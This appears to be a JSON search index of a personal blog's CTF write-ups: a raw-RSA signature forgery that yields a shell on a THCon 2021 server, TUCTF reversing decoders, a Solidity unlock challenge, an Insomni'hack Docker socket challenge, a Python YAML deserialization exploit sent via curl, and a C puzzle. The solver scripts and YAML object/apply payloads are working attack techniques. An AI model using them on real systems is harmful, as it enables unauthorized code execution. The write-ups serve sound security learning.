if __name__ == '__main__': s = SecureSigner() print(\"Here are your parameters:\\n- modulus n: {:d}\\n- public exponent e: {:d}\\n\".format(s.n, s.e)) while True: menu() ","date":"0001-01-01","objectID":"/2021-06-14-thcon-others/:3:0","tags":["THCon","CTF","2021","Crypto"],"title":"THCon CTF 2021 - Crypto challenges","uri":"/2021-06-14-thcon-others/"},{"categories":null,"content":"Solving the challenge The server is able to: Sign integers below 256 Execute a Unix command whose signature is correct. The user must provide the command, and its signature. For instance, we’d like to execute ls on the server, to see where the flag is located, and then cat the flag file. The issue is that ls transformed to an integer (bytes_to_long('ls'.encode())) is far above 256. So, we need to find a way to get the signature of bigger integers… We are able to do that because the server performs raw RSA signature. So, basically, let’s say that if we want to sign integer 4, this is actually 4^d mod n (d being the private exponent), and this is 2^d * 2^d mod n. So, we can also compute the signature of 4 (s4) by asking the signature of 2 (s2), and then s4 = s2 * s2 mod n. See here ","date":"0001-01-01","objectID":"/2021-06-14-thcon-others/:4:0","tags":["THCon","CTF","2021","Crypto"],"title":"THCon CTF 2021 - Crypto challenges","uri":"/2021-06-14-thcon-others/"},{"categories":null,"content":"Find the shell command The hardest part of the challenge is now to find a shell command whose prime factors are below 256. I compute prime factors for various shell commands. There is a nice shell command factor for that by the way! #!/bin/bash for c in 'ls' 'sh' 'bash' 'll' ' sh' do integer=$(printf \"%d\" 0x`echo -n \"$c\" | xxd -ps`) factors=$(factor $integer) echo \"Command $c-\u003e factors: $factors\" done Unfortunately, neither ls nor sh work, because some of their factors are \u003e 256. ll is close but not working. Command ls -\u003e factors: 27763: 27763 Command sh -\u003e factors: 29544: 2 2 2 3 1231 Command bash -\u003e factors: 1650553704: 2 2 2 3 3 22924357 Command ll -\u003e factors: 27756: 2 2 3 3 3 257 Command sh -\u003e factors: 2126696: 2 2 2 11 11 13 13 13 The command sh (i.e starting with a space) should work. ","date":"0001-01-01","objectID":"/2021-06-14-thcon-others/:5:0","tags":["THCon","CTF","2021","Crypto"],"title":"THCon CTF 2021 - Crypto challenges","uri":"/2021-06-14-thcon-others/"},{"categories":null,"content":"Executing the command Once the command is found, we just need to apply the theory we identified earlier. My program below must be run in parallel with the real one on the remote server. My program tells me what to ask to the real one: It asks me to provide the value n that the real server displays It asks to provide the result of various signatures of ints Based on those values, it computes the correct signature for the shell command. from Crypto.Util.number import bytes_to_long, isPrime def factors(n): ''' simplified function to find primes (won't work in all cases!) we are only interested in primes \u003c 256 In Shell, use # factor xxx ''' factor = [] primes = [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,199,211,223,227,229,233,239,241,251] current = n while not isPrime(current): for p in primes: if current % p == 0: current = current // p factor.append(p) break factor.append(current) return factor cmd = ' sh' cmd_int = bytes_to_long(cmd.encode()) factor_list = factors(cmd_int) n = int(input(\"Please provide n: \")) sig = 1 for f in factor_list: print(\"Please ask signature of int {}\".format(f)) intermediate = int(input(\"value: \")) sig = sig * intermediate sig = sig % n print(\"Please send command: '{}'\".format(cmd)) print(\"Use this computed signature: {}\".format(sig)) The signature is recognized (see below) and I get a shell on the remote server. And easily then the flag. 1 - Sign an 8-bit integer 2 - Execute command 3 - Exit Choice: 2 Command: sh Signature: 41609626228993531674308423452763833896469702200570002126534943100863455927692030907187524746966991634244450965040800407545526148474306900123580404483596334993024977357851683651502221718086925851882951517245197834174887191621924133861437811355658364899236723602859660221594479159243377647935842532691897847973 ls flag.txt server.py cat flag.txt THCon21{Textb00k_RS4_Mall3ab1l1ty} The flag is THCon21{Textb00k_RS4_Mall3ab1l1ty}. ","date":"0001-01-01","objectID":"/2021-06-14-thcon-others/:6:0","tags":["THCon","CTF","2021","Crypto"],"title":"THCon CTF 2021 - Crypto challenges","uri":"/2021-06-14-thcon-others/"},{"categories":null,"content":"I tried TU CTF. I only played 1 or 2 hours and flagged quite a lot: this is an easy CTF, good for beginners. See some very quick write-ups below. Unfortunately I can’t remember the titles of the challenges. ","date":"0001-01-01","objectID":"/2019-12-1-tuctf/:0:0","tags":["TU","CTF","2019"],"title":"TUCTF 2019","uri":"/2019-12-1-tuctf/"},{"categories":null,"content":"Challenge 1 We have a binary to decompile. I use Ghidra and locate a strange function called thisone The printFlag function decodes the flag. I write a program to mimic the decoding: #include \u003cstring.h\u003e#include \u003cstdio.h\u003e int main(int argc, char **argv) { char encrypted [] = \"\\\\PJ\\\\fC|)L0LTw@Yt@;Twmq0Lw|qw@w2$a@0;w|)@awmLL|Tw|)LwZL2lhhL0k \"; char decrypted[40]; int i = 0; int len = strlen(encrypted); memset(decrypted, 0x00, 40); strcpy(decrypted, encrypted); printf(\"encrypted=%s\\n\", encrypted); printf(\"len=%d\\n\",len); while (i\u003clen) { decrypted[i] = ((((decrypted[i] ^ 0x0f) - 0x1d) * 8) % 0x5f) + ' '; i++; } printf(\"%s\\n\", decrypted); } I get the flag: TUCTF{7h3r35_4lw4y5_m0r3_70_4_b1n4ry_7h4n_m3375_7h3_d3bu663r} ","date":"0001-01-01","objectID":"/2019-12-1-tuctf/:1:0","tags":["TU","CTF","2019"],"title":"TUCTF 2019","uri":"/2019-12-1-tuctf/"},{"categories":null,"content":"Challenge 2 We got an object file run.o. We decompile it using Ghidra. The function checkPassword explains how the password is validated. There is an XOR with 0xaa. I write the following code: #include \u003cstdio.h\u003e#include \u003cstring.h\u003eint main(int argc, char **argv) { char encrypted [] = { 0xfd,0xff,0xd3,0xfd,0xd9,0xa3,0x93,0x35,0x89,0x39,0xb1,0x3d,0x3b,0xbf,0x8d,0x3d,0x3b,0x37,0x35,0x89,0x3f,0xeb,0x35,0x89,0xeb,0x91,0xb1,0x33,0x3d,0x83,0x37,0x89,0x39,0xeb,0x3b,0x85,0x37,0x3f,0xeb,0x99,0x8d,0x3d,0x39,0xaf, 0x00 }; char pass[0x2c]; int len = 0x2c; int i = 0; int encrypted_len = strlen(encrypted); printf(\"len=%d\\n\", encrypted_len); printf(\"expected=%d\\n\", len); while (i\u003clen) { pass[i] = ((encrypted[i] \u003e\u003e 1) ^ 0xaa); printf(\"i=%d character=%c hex=%x \\n\", i, pass[i], pass[i]); i++; } printf(\"%s\\n\", pass); return 0; } and get the flag: TUCTF{c0n6r47ul4710n5_0n_br34k1n6_7h15_fl46} ","date":"0001-01-01","objectID":"/2019-12-1-tuctf/:2:0","tags":["TU","CTF","2019"],"title":"TUCTF 2019","uri":"/2019-12-1-tuctf/"},{"categories":null,"content":"Description The challenge provides the following contract, and the goal is to “unlock” to get the flag. pragma solidity ^0.7; contract welcome { bool public isLocked; string public key; constructor(string memory _key) { isLocked = true; _key = key; } function unlock(string memory _something) public { if (keccak256(abi.encodePacked(key)) == keccak256(abi.encodePacked(_something))) { isLocked = false; } } } Setup The CTF provided a very nice tutorial to setup the THCONETH network: Setup Metamask and install it in the browser Add access to the THCONETH network (created for THCon CTF). 2 networks were provided THConETH_1 and THConETH_2 as backup endpoint. Network Name: THConETH_1 RPC URL: https://node01-eth.ctf.thcon.party:8545 Chain ID: 31400 Currency Symbol: THConETH Block Explorer URL: (leave empty) Connect to one of these networks (“Switch network” in Metamask). This gives us our personal login address. Another important point in the tutorial was that, on the THConETH network, we were asked to set transactions with a minimum base fee of 110 GWEI, and a minimum priority fee of 55 GWEI. Deploy the contract To start the challenge, we need 2 things: To deploy the contract. Just need to click a button on the CTF infrastructure. Once deployed, the interface gives us the contract' address. To mine a few THConETH tokens to be able to perform a few transactions. This could be done by mining on one of the 2 provided faucets (https://node0X-eth.ctf.thcon.party where X is 1 or 2) { width=50% } Specify your personal login address as recipient ETH address. Solving the challenge In the contract, we see that to unlock, we need a key: function unlock(string memory _something) public { if (keccak256(abi.encodePacked(key)) == keccak256(abi.encodePacked(_something))) { isLocked = false; } } So, the idea is to read the key. I used an online tool: remix.ethereum.org. In “Deploy \u0026 Run transactions”, select “At Address” and specify the address of the contract which was deployed. Then click on the button “key” to read the value of the key. Notice the key is WelcomeToTHCON23_WelcomeToSolidity. Then, we just need to call unlock with this key. This can be done with the Remix website: specify the key and click on Transact. A pop-up will appear in Metamask. You need to ensure that the base and priority fees are set as specified in the tutorial for the transaction to be processed. Once processed, unlock succeeds and the challenge is unlocked. The challenge web page provides the flag :) My feedback I had looked into a few Web3 challenges at Insomni’hack, so my first initiative for this one was to do everything from a Python script. I attempted to read the key with: key = web3.to_text(web3.eth.get_storage_at(contract_address,1)) Then, I was hinted this was really overkill for this level, and started looking into online tools and ended on Remix. At first, everything is a bit mysterious, and I confess I’m not sure I fully understood everything (e.g are we able to read key because it is public?), but I certainly know more than at the beginning! This challenge was really cool to learn about block chains, and I loved it that the CTF created their own currency and block chain for us to have fun with. Thanks! ","date":"0001-01-01","objectID":"/2023-04-22-welcome/:0:0","tags":["THCon","CTF","2023","Web3","Ethereum","Metamask","remix"],"title":"Welcome (THCon CTF 2023)","uri":"/2023-04-22-welcome/"},{"categories":null,"content":"Actually, you’re not that welcome… ;-) You’ll understand why. Update March 28, 2023. Solutions to protect your computer. Description of the challenge “Welcome to Insomnihack! No bruteforce is needed! Simply run the following command on the attached file, and wait for the flag (it should take up to 1 minute). docker-compose up Have fun!\" The challenge also provided a docker-compose.yml file. version: \"3.9\" services: welcome: image: welcome.insomnihack.ch/welcome_inso23-0 network_mode: \"host\" volumes: - '/var/run/docker.sock:/var/run/docker.sock' There are 2 things I don’t like in this file: Network mode set to host. This allows the containter to access any ports of the host. Sharing /var/run/docker.sock. This is a known security flaw. It gives root privileges to the container (because the owner of /var/run/docker.socker is root - see stackoverflow). To be honest, I was more concerned by the first point than by the second. I thought the socket would be used to convey the flag (we’re in a CTF after all), whereas I didn’t see any point in the first except stealthy actions. (Bad) Solution The docker compose file retrieves a Docker container of Insomnihack. The challenge is as easy as it seems: you just have to run the command, wait a little and you’ll get the flag: $ docker-compose up Pulling welcome (welcome.insomnihack.ch/welcome_inso23-0:)... latest: Pulling from welcome_inso23-0 63b65145d645: Pull complete 0c7ac114858a: Pull complete 7a854723d4a1: Pull complete 371f835e9088: Pull complete Digest: sha256:3bb6419219e33e699c859737ee70fe50214cec41c8f6cc52acf7e7cf34704f06 Status: Downloaded newer image for welcome.insomnihack.ch/welcome_inso23-0:latest Creating ins23_welcome_1 ... done Attaching to ins23_welcome_1 welcome_1 | flag[0]=I welcome_1 | flag[1]=N welcome_1 | flag[2]=S welcome_1 | flag[3]={ welcome_1 | flag[4]=7 welcome_1 | flag[5]=H The flag is long, so I decided to do some sed on the output to retrieve the flag: Erase everything before the equal sign: sed -e 's/.*=//g' file Then I removed \\n with a quick Python script. There is probably a better one-liner solution. \u003e\u003e\u003e buf = open('welcome2.txt','r').read() \u003e\u003e\u003e buf 'I\\nN\\nS\\n{\\n7\\nH\\n4\\nN\\nK\\n5\\n_\\nF\\n0\\nr\\n-\\n1\\n3\\n7\\n7\\n1\\nN\\n6\\n_\\nY\\n0\\nU\\nr\\n_\\n5\\n0\\nC\\nK\\n3\\n7\\n.\\n3\\nX\\nP\\n0\\n5\\n3\\nD\\n!\\n!\\n}\\n' \u003e\u003e\u003e buf.replace('\\n','') 'INS{7H4NK5_F0r-13771N6_Y0Ur_50CK37.3XP053D!!}' Then, we can flag with INS{7H4NK5_F0r-13771N6_Y0Ur_50CK37.3XP053D!!}. By the way, the flag reminds us that sharing sockets is a bad idea: - '/var/run/docker.sock:/var/run/docker.sock' Shame After this, if you reboot, you’ll have a bad surprise :( I will discuss the more than borderline ethics afterwards - see Conclusion. Let’s get rid of this crap first. We easily locate the corresponding lines in the ~/.bashrc file: But is it all? Let’s check. In Docker images, we spot several welcome.insomnihack.ch/welcome_inso23-44 and the culprit welcome.insomnihack.ch/shame. $ docker images REPOSITORY TAG IMAGE ID CREATED SIZE welcome.insomnihack.ch/shame latest 6998c3ece6a2 2 days ago 11.9MB welcome.insomnihack.ch/welcome_inso23-44 latest 764029acd9f4 2 days ago 13MB welcome.insomnihack.ch/welcome_inso23-43 latest afd0edc6ce2e 2 days ago 13MB We inspect the image with docker image inspect welcome.insomnihack.ch/shame: \"Data\": { \"LowerDir\": \"/var/lib/docker/overlay2/1e2784c49c73b6baecf076714839ff70fdc386214cde86a4b3e595c2071ef98f/diff:/var/lib/docker/overlay2/9b48f754a46eaf565917648fafa91fc6d066310506fa8c59e9abb4c27ddf1dba/diff:/var/lib/docker/overlay2/1c48b2594afe24166bf485a1b4416c242586bbbf4aaad4971860ee975a0dd030/diff\", \"MergedDir\": \"/var/lib/docker/overlay2/dbba8172b6851fa39220477106e292b569daf141928835acf1a5e835630eb8ae/merged\", \"UpperDir\": \"/var/lib/docker/overlay2/dbba8172b6851fa39220477106e292b569daf141928835acf1a5e835630eb8ae/diff\", \"WorkDir\": \"/var/lib/docker/overlay2/dbba8172b6851fa39220477106e292b569daf141928835acf1a5e835630eb8ae/work\" }, We are interested in the data directories which are going to hold ","date":"0001-01-01","objectID":"/2023-03-25-shame/:0:0","tags":["Insomnihack","CTF","2023","virus","ethics","Docker"],"title":"Welcome ... to Questionable Ethics (Insomni'hack CTF 2023)","uri":"/2023-03-25-shame/"},{"categories":null,"content":"Wheels n Whales Category: Web “I’ve heard that Whales and Wheels are the new hot thing. So a buddy of mine build a website where you can get your own. I think he hid an easter egg somewhere, but I can’t get to it, can you help me?\" There is a website that goes to http://chal.cybersecurityrumble.de:7780/ A file is provided: web.py import yaml from flask import redirect, Flask, render_template, request, abort from flask import url_for, send_from_directory, make_response, Response import flag app = Flask(__name__) EASTER_WHALE = {\"name\": \"TheBestWhaleIsAWhaleEveryOneLikes\", \"image_num\": 2, \"weight\": 34} @app.route(\"/\") def index(): return render_template(\"index.html.jinja\", active=\"home\") class Whale: def __init__(self, name, image_num, weight): self.name = name self.image_num = image_num self.weight = weight def dump(self): return yaml.dump(self.__dict__) @app.route(\"/whale\", methods=[\"GET\", \"POST\"]) def whale(): if request.method == \"POST\": name = request.form[\"name\"] if len(name) \u003e 10: return make_response(\"Name to long. Whales can only understand names up to 10 chars\", 400) image_num = request.form[\"image_num\"] weight = request.form[\"weight\"] whale = Whale(name, image_num, weight) if whale.__dict__ == EASTER_WHALE: return make_response(flag.get_flag(), 200) return make_response(render_template(\"whale.html.jinja\", w=whale, active=\"whale\"), 200) return make_response(render_template(\"whale_builder.html.jinja\", active=\"whale\"), 200) class Wheel: def __init__(self, name, image_num, diameter): self.name = name self.image_num = image_num self.diameter = diameter @staticmethod def from_configuration(config): return Wheel(**yaml.load(config, Loader=yaml.Loader)) def dump(self): return yaml.dump(self.__dict__) @app.route(\"/wheel\", methods=[\"GET\", \"POST\"]) def wheel(): if request.method == \"POST\": if \"config\" in request.form: wheel = Wheel.from_configuration(request.form[\"config\"]) return make_response(render_template(\"wheel.html.jinja\", w=wheel, active=\"wheel\"), 200) name = request.form[\"name\"] image_num = request.form[\"image_num\"] diameter = request.form[\"diameter\"] wheel = Wheel(name, image_num, diameter) print(wheel.dump()) return make_response(render_template(\"wheel.html.jinja\", w=wheel, active=\"wheel\"), 200) return make_response(render_template(\"wheel_builder.html.jinja\", active=\"wheel\"), 200) if __name__ == '__main__': app.run(host=\"0.0.0.0\", port=5000) ","date":"0001-01-01","objectID":"/2020-11-01-whales/:0:0","tags":["CSR","CTF","2020","Python"],"title":"Wheels n Whales - Cyber Security Rumble CTF 2020","uri":"/2020-11-01-whales/"},{"categories":null,"content":"Understanding the program web.py is a Flask application, where Flask is - in short - a Python framework to create websites. The flag is displayed if we manage to create an “Easter Whale”: import flag ... EASTER_WHALE = {\"name\": \"TheBestWhaleIsAWhaleEveryOneLikes\", \"image_num\": 2, \"weight\": 34} ... if whale.__dict__ == EASTER_WHALE: return make_response(flag.get_flag(), 200) The problem is that we can’t (normally) create such a whale, because whale names are limited to 10 characters: @app.route(\"/whale\", methods=[\"GET\", \"POST\"]) def whale(): if request.method == \"POST\": name = request.form[\"name\"] if len(name) \u003e 10: return make_response(\"Name to long. Whales can only understand names up to 10 chars\", 400) ","date":"0001-01-01","objectID":"/2020-11-01-whales/:1:0","tags":["CSR","CTF","2020","Python"],"title":"Wheels n Whales - Cyber Security Rumble CTF 2020","uri":"/2020-11-01-whales/"},{"categories":null,"content":"We don’t have wheels without a reason The program also allows to create wheels. Wheels can be instantiated using the standard constructor, or read from a YAML configuration file: def from_configuration(config): return Wheel(**yaml.load(config, Loader=yaml.Loader)) Have a look on Internet, and you’ll see everywhere that using the standard YAML loader is not safe. “Warning: It is not safe to call yaml.load with any data received from an untrusted source! “ In a CTF, this is certainly not genuine, the flaw is there on purpose and we must exploit it. ","date":"0001-01-01","objectID":"/2020-11-01-whales/:2:0","tags":["CSR","CTF","2020","Python"],"title":"Wheels n Whales - Cyber Security Rumble CTF 2020","uri":"/2020-11-01-whales/"},{"categories":null,"content":"Posting a configuration So, we’ll be abusing the yaml.load function, which requires that we perform an HTTP POST on wheel, and provide a config in the form: @staticmethod def from_configuration(config): return Wheel(**yaml.load(config, Loader=yaml.Loader)) [..] @app.route(\"/wheel\", methods=[\"GET\", \"POST\"]) def wheel(): if request.method == \"POST\": if \"config\" in request.form: wheel = Wheel.from_configuration(request.form[\"config\"]) We can do the POST with curl: curl -X POST -d 'config=...' ","date":"0001-01-01","objectID":"/2020-11-01-whales/:3:0","tags":["CSR","CTF","2020","Python"],"title":"Wheels n Whales - Cyber Security Rumble CTF 2020","uri":"/2020-11-01-whales/"},{"categories":null,"content":"How I wasted hours stupidly My goal was to create that Easter Whale, and I spent hours understanding which exact syntax to use. I saw here that we could create objects using the syntax !!python/object:CLASS .... As Whales are defined in web.py, we need to specify web.Whale. I tried locally on my host, and the Flask application would complain all the time: “TypeError: type object argument after ** must be a mapping, not Whale” I tried several things: Create multiple YAML documents. Error: “expected a single document in the stream” Different syntax to provide the document using the serialized or the unserialized form Adding URL encoding in characters Using different options of curl (–data-binary, -F…) curl -X POST -d 'config=\"\"\"\\n!!python/object:web.Whale\\nname:TheBestWhaleIsAWhaleEveryOneLikes\\nimage_num:2\\nweight:34\"\"\"' http://127.0.0.1:5000/wheel curl -X POST -d 'config=\"\"\"\\n!!python/object:web.Whale\\nname:TheBestWhaleIsAWhaleEveryOneLikes\\nimage_num:2\\nweight:34\"\"\"' http://127.0.0.1:5000/wheel curl -X POST -d 'config=\"\"\"\\n!!python/object:web.Whale\\nname: TheBestWhaleIsAWhaleEveryOneLikes\\nimage_num: 2\\nweight: 34\"\"\"' http://127.0.0.1:5000/wheel curl -X POST -d 'config=\\\"\\\"\\\"%0A%21%21python/object:web.Whale%0Aname: TheBestWhaleIsAWhaleEveryOneLikes%0Aimage_num: 2%0Aweight: 34%0A\\\"\\\"\\\"' http://127.0.0.1:5000/wheel curl -X POST -d 'config=\\\"\\\"\\\"%0A%21%21python/object:web.Whale%0A%20name%3A%20TheBestWhaleIsAWhaleEveryOneLikes%0A%20image_num:%202%0A%20weight:%2034%0A\\\"\\\"\\\"' http://127.0.0.1:5000/wheel ","date":"0001-01-01","objectID":"/2020-11-01-whales/:4:0","tags":["CSR","CTF","2020","Python"],"title":"Wheels n Whales - Cyber Security Rumble CTF 2020","uri":"/2020-11-01-whales/"},{"categories":null,"content":"Closer to the solution I stumbled on YAML Deserialization Attack in Python. I learned that it was possible to launch process that way: `\"\"”!!python/object/apply:subprocess:Popen ls”\"\"` I struggled with the formatting and it didn’t work. I tried again with a non-serialized syntax: !!python/object/apply:builtins.range [1, 10, 1] and it worked better, except it refused to create a range, because it was expecting a mapping. ","date":"0001-01-01","objectID":"/2020-11-01-whales/:5:0","tags":["CSR","CTF","2020","Python"],"title":"Wheels n Whales - Cyber Security Rumble CTF 2020","uri":"/2020-11-01-whales/"},{"categories":null,"content":"Solution Then, after a while (and lots of despair), I realized that even if I managed to create my Easter Whale, it wouldn’t help me very much, because how would I then get the flag? The flag would only be displayed if I posted such a whale on the /whale page. So, I thought: how about simply calling get_flag(). I concentrated on this goal: We need the !!python/object/apply syntax Function get_flag() is in the flag module, so I’ll need to call flag.get_flag After a few attempts, it was still complaining that it was expecting a mapping for the Wheel object. So, I got the idea to put that !!python/object stuff inside a field of the Wheel object. {name: !!python/object/apply:flag.get_flag [], image_num: 2, diameter: 5} We don’t care at all about image_num and diameter (but must provide them to create the Wheel). Finally, I worked out the final solution with some URL encoding: curl -X POST -d 'config={name:%20!!python/object/apply:flag.get_flag [], image_num: 2, diameter: 5}' http://chal.cybersecurityrumble.de:7780/wheel [..] \u003ch1\u003eHere you go\u003c/h1\u003e \u003ch1\u003eCSR{TH3_QU3STION_I5_WHY_WHY_CAN_IT_DO_THAT?!?}\u003c/h1\u003e Diameter: 5 \u003ccode\u003e diameter: 5 image_num: 2 name: CSR{TH3_QU3STION_I5_WHY_WHY_CAN_IT_DO_THAT?!?} [..] Despite “easy”, I learned a lot with this challenge and enjoyed it. I had no idea about this YAML exploit, and will be certain to be cautious if I ever need to use it in the future. ","date":"0001-01-01","objectID":"/2020-11-01-whales/:6:0","tags":["CSR","CTF","2020","Python"],"title":"Wheels n Whales - Cyber Security Rumble CTF 2020","uri":"/2020-11-01-whales/"},{"categories":null,"content":"Zeh *“For the CSR we finally created a deutsche Programmiersprache! nc chal.cybersecurityrumble.de 65123” and the following C program is provided: #define wenn if #define ansonsten else #define Zeichen char #define Zeiger * #define Referenz \u0026 #define Ausgabe(s) puts(s) #define FormatAusgabe printf #define FormatEingabe scanf #define Zufall rand() #define istgleich = #define gleichbedeutend == nichts Hauptroutine(nichts) { Ganzzahl i istgleich Zufall; Ganzzahl k istgleich 13; Ganzzahl e; Ganzzahl Zeiger p istgleich Referenz i; FormatAusgabe(\"%d\\n\", i); fflush(stdout); FormatEingabe(\"%d %d\", Referenz k, Referenz e); schleife(7) k istgleich bitrverschieb(Zeiger p, k % 3); k istgleich diskreteAddition(k, e); wenn(k gleichbedeutend 53225) Ausgabe(Fahne); ansonsten Ausgabe(\"War wohl nichts!\"); } ","date":"0001-01-01","objectID":"/2020-10-31-zeh/:0:0","tags":["CSR","CTF","2020","C"],"title":"Zeh - Cyber Security Rumble CTF 2020","uri":"/2020-10-31-zeh/"},{"categories":null,"content":"Removing the defines It helps to know a little of German (Hauptroutine means main), but online translation is far enough. The program is mainly “obfuscated” by the #define at the beginning. We replace them all by the official C command. #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e void main(void) { int i = rand(); int k = 13; int e; int *p = \u0026i; printf(\"%d\\n\", i, k, *p); fflush(stdout); scanf(\"%d %d\", \u0026k, \u0026e); for (int i=7; i--;) { k = (*p) \u003e\u003e (k % 3); } k = k ^ e; if(k == 53225) puts(\"Fahne\"); else puts(\"War wohl nichts!\"); } ","date":"0001-01-01","objectID":"/2020-10-31-zeh/:1:0","tags":["CSR","CTF","2020","C"],"title":"Zeh - Cyber Security Rumble CTF 2020","uri":"/2020-10-31-zeh/"},{"categories":null,"content":"Where is the flag? The flag is not provided in the C program. It is included in #include \"fahne.h\" (which means flag), and displayed if this condition is met: if(k == 53225) puts(\"Fahne\"); else ... ","date":"0001-01-01","objectID":"/2020-10-31-zeh/:2:0","tags":["CSR","CTF","2020","C"],"title":"Zeh - Cyber Security Rumble CTF 2020","uri":"/2020-10-31-zeh/"},{"categories":null,"content":"Getting the right numbers So the program: Gets a random number (note, they just call rand() so it will not be truly random, the same each time. Read 2 integers (k and e) Do some obscure computation on k, *p, i, e. Display the flag is k is 53225 We need to work out a solution where we will get k 53225. IMHO, the best way to understand what is happening is add a few printf to display the various values of k, *p, i and e. i=1804289383 k= 13 *p= 1804289383 1804289383 1804289383 i=6 k= 902144691 *p= 1804289383 e=1804289383 i=5 k= 1804289383 *p= 1804289383 e=1804289383 i=4 k= 902144691 *p= 1804289383 e=1804289383 i=3 k= 1804289383 *p= 1804289383 e=1804289383 i=2 k= 902144691 *p= 1804289383 e=1804289383 i=1 k= 1804289383 *p= 1804289383 e=1804289383 i=0 k= 902144691 *p= 1804289383 e=1804289383 k xor e --\u003e k=1582229460 Not good! We can try again, and we confirm i always gets the same value. We also note that k apparently only takes 2 different values: 902144691 and 1804289383. The last computation is k ^ e and we want that to be 53225. We can provide 2 integers to the program: k and e. Let’s use k=i=1804289383. So, now we need to adapt e. The last value for k is 902144691 (see above). So, we compute 902144691 ^ 53225 = 902131034. Let’s use that for e. We try that on the CTF’s server: nc chal.cybersecurityrumble.de 65123 1804289383 1804289383 902131034 CSR{RUECKWARTSINGENEUREN} Note we get the same i. Then we enter k=1804289383 and our computed e=902131034. It works, we get the flag :) ","date":"0001-01-01","objectID":"/2020-10-31-zeh/:3:0","tags":["CSR","CTF","2020","C"],"title":"Zeh - Cyber Security Rumble CTF 2020","uri":"/2020-10-31-zeh/"}]